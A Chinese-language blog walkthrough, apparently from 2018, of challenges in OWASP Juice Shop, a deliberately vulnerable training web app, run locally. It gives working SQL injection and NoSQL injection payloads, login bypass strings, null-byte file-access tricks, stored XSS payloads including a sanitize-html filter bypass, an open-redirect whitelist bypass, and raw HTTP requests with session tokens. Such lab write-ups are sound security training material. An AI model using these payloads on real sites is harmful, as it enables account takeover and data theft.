title: owasp juice shop
author: Qianye
abbrlink: 6faad9f0
tags:
  - knowledge
  - 'vulnerability '
categories:
  - knowledge
  - vulnerability
date: 2018-03-15 08:53:00
---
闲来无事，搭个漏洞小靶场，玩一玩。




<!-- more -->

# 安装方法
在ubuntu下安装
1.先安装docker
```bash
$sudo apt-get install docker
```
2.安装owasp juice shop
```bash
$docker pull bkimminich/juice-shop
```
有点卡，下载失败可多次尝试
3.运行 juice shop
```bash
$docker run -d -p 3000:3000 bkimminich/juice-shop
```
4.访问虚拟机地址加3000端口




# 一颗星
## Score Board
在首页，查看源码，看了挺久，终于在购物篮的页面上看到了一个Scorer-Board的链接，点击进去，成功解决。

## Admin Section
这关要求找到管理员的登入界面，用御剑等扫描一下没成功，直接根据任务的英文要求，输入administration，成功解决一关，看来要仔细读题目。
## Confidential Document
	
要求阅读机密文件。还是老思路先用扫描器扫一下还看一下有没有robots.txt，发现不行，到处找了，一下，偶然在`关于我们`的页面上发现了一些显眼的字眼 ，将其下载下来，一开始认为里面会有不可访问的页面，突然看到下载的链接
```bash 
http://192.168.20.132:3000/ftp/legal.md?md_debug=true
```
访问一下
```bash
http://192.168.20.132:3000/ftp/
```
成功
## Deprecated Interface
在投诉的页面上，提交一个xml小文件即可。具体原因查看源代码。

## Error Handling
这关要求引发一个错误，在解决Confidential Document 这关时，访问机密文件时，就引发了。
## Five-Star Feedback
在administration的管理页面中，就有删除五颗星的评分，就可以。

## Redirects Tier 1

## XSS Tier 1
实现xss，首先想到的是搜索框，直接输入
```bash
<script>alert("XSS")</script>.
```
## Zero Stars
在联系我的页面上有个评价，评价时，使用bp抓包，修改一下就ok。

# 两颗星
## Basket Access

## Christmas Special
在搜索框上，输入1’，出现报错
```bash

{
  "error": {
    "message": "SQLITE_ERROR: near \"'%'\": syntax error",
    "stack": "SequelizeDatabaseError: SQLITE_ERROR: near \"'%'\": syntax error\n    at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n    at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n    at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n    at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"
    },
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"
  }
}
```
	
从报错的语句可以知道后台sql数据库查询语句。
deletedAt该列的值为空的才会显示，而我们要加的是2014年的商品，肯定deletedAt值不为空，所以页面上显示不出来，通过构造查询语句注释掉deletedAt IS NULL，即可看到2014年圣诞节的商品。
最终
```bash
')) --
```
   
## Forgotten Sales Backup
只能下载md和pdf的文件，可以通过%00截断</br>

```bash
http://192.168.20.132:3000/ftp/coupons_2013.md.bak%2500.md
```
## Login Admin
在administration的管理页面中，可以知道管理员的登入账号为admin@juice-sh.op，弱口令猜测admin123,成功登入，解决此题和Password Strength

## Password Strength
上题的方法解决
## Reset Jim's Password
通过输入` jim@juice-sh.op ` 邮箱，要社工查找
Your eldest siblings middle name?名，查找得到
George Samuel Kirk 输入Samuel，然后填密码即可。
	
## Weird Crypto
在联系我的页面中的评价中，填写base64编码即可。
# 三颗星
## Easter Egg Tier 1
在ftp下的 eastere.gg，然后下载，将其中的一段密文base64解密，在访问其解密后的路径即可
## Eye Candy
开启JavaScript console 输入命令
```bash
document.getElementById("theme").setAttribute("href","css/geo-bootstrap/swatch/bootstrap.css");
```
## Forged Feedback

## Forgotten Developer Backup
```bash
http://192.168.20.132:3000/package.json.bak％2500.md将最终解决挑战。
```

##  Login Bender

```bash
bender@juice-sh.op'--
```
## Login Bjoern
暴力破解哈希不可能。官方答案说解密的方法，就在登入页面上的源码中一个dist/juice-shop.min.js链接里。密码为邮箱的base64加密。
## Login Jim
万能密码绕过
```bash
jim@juice-sh.op' or 1 and 1 --+
```
## Misplaced Signature File
```bash
http://192.168.20.132:3000/suspicious_errors.yml％2500.md
```
## NoSQL Injection Tier 1
要求让服务器休眠一段时间.
访问一下链接即可
```bash
http://192.168.239.128:3000/rest/product/sleep(100)/reviews 
```
## NoSQL Injection Tier 2
同时更新所有的评论</br>
向
```bash
http://192.168.20.132:3000/rest/product/reviews
```
提交patch请求。
body为
```bash
{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" } 
```
Headers为,其中Authorization,根据自己的去抓包值去修改。
```bash
conent-type:application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwNzY3MDQsImV4cCI6MTUyMTA5NDcwNH0.vSA_fSFw1-yrRLYJatnIKmJvXYgBtvdI5pZOI1UNCVZ6_qtQ-hS2ETsvm_gi1p_d3E39Czc-__2GTtaE582C9jlrAOxmYiDNuzeM9PHxa8kd7hb40EAs6srD17vE_HDlU0LE-4VBUScjLPoRXWjQXM8QFC3_D9Eyc6FAM--T8TQ
````

## Payback Time
## Product Tampering

## Reset Bender's Password
这道题需要社工，最后会查到`Stop'n'Drop`。
## Retrieve Blueprint
下载一个想设计文件通过3d打印去打。
先下载一张图片。通过图片可知相机制造商为openscad，谷歌可知这个软件编辑的3d打印的格式为.stl，暴力破解http://192.168.239.128:3000/public/images/products/  该目录下爆破.stl。看源码也知道有个JuiceShop.stl文件。
## Typosquatting Tier 1
在ftp下载package.json.bak 文件并打开，找到epilogue-js吗，百度去搜一下原因。在联系我们的页面上，提交`epilogue-js`的评论
## Upload Size
在投诉那里先上传一个小于100kb的.pdf文件， 通过bp抓包，修改为大于100kb小于200kb的。就ok
## Upload Type
修改一下上一题的后缀名即可
## User Credentials
根据登入处的报错知道有 id,user,email字段
```bash
{"error":{"message":"SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error","stack":"SequelizeDatabaseError: SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error\n at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)","name":"SequelizeDatabaseError","parent":{"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"},"original":{"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"},"sql":"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"}}
```
在 `Christmas Special`这题上已经有过分析，要

## Vulnerable Library
## XSS Tier 2
实现存储行xss就要插入数据库，一开始在联系我们的评论界面上提交xss语句，进入后台查看，发现评论为空，全被过滤了，只好另寻他法。最后想到在注册用户那里，注册一个账户，页面上有js判断，不能直接插入，只好bp转包，将用户名改为 `<script>alert("XSS2")</script>` ，返回数据包失败，从返回的消息，知道将双引号，加了反斜杠，最后构造`<script>alert(\"XSS\")</script>`,返回包成功，再访问`administration`页面，弹框成功。
## XSS Tier 3
根本不使用前端应用程序执行持续的XSS攻击。
```bash
POST /api/Products HTTP/1.1
Host: 192.168.20.132:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqo
Content-Length: 82
Cookie: continueCode=QbNz3wepgLV0eBH4urh8tnc8IqT1iBf7uKtwIbT7ibuEI7f9ZABKn9jYlaxZ; io=QvKEDdlKHoHGbeCDAABM; email=431774437%40qq.com; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqo
X-Forwarded-For: 127.0.0.1, 127.0.0.1
Connection: close
Upgrade-Insecure-Reque

{"name": "XSS3", "description": "<script>alert(\"XSS\")</script>", "price": 47.11}
```
## XXE Tier 1
# 四颗星
## CSRF
万能密码登入 ，通过bp抓包，可删除现有的current的，即可。
```
GET /rest/user/change-password?current=4567\89\76&new=123456&repeat=123456 
```
## Easter Egg Tier 2
## JWT Issues Tier 1
## Login CISO
## Redirects Tier 2
在
```bash
http://192.168.20.132:3000/ redirect？to = https：//github.com/bkimminich/juice-shop。
```
有个重定向。
尝试重定向到一些无法识别的URL会因白名单验证而失败406 Error: Unrecognized target URL for redirect。
卸下to参数（HTTP：//本地主机：3000 /重定向）将转而产生500 TypeError: Cannot read property 'indexOf' of undefined，其中indexOf表示在这样的白名单中的作品严重的缺陷。
制作重定向网址，以便目标网址to带有包含白名单网址的自己的参数，例如 
```bash
http://192.168.20.132:3000/redirect?to=http://www.baidu.com?pwned=https://github.com/bkimminich/juice-shop
```
通过忘记密码机制重置本德的密码
## Reset Bjoern's Password
## Typosquatting Tier 2
## XSS Tier 4
里就利用sanitize-html这个版本的漏洞，编号为CVE-2016-1000237，用google搜索。根据该版本的特征通过不递归绕过验证。在评论处，构造语句<<script>4</script>script>alert("XSS")<</script>/script>
## XXE Tier 2
感觉挺无聊的，等以后有空再玩。</br>
参考文章</br>
https://github.com/bkimminich/pwning-juice-shop/blob/master/appendix/solutions.md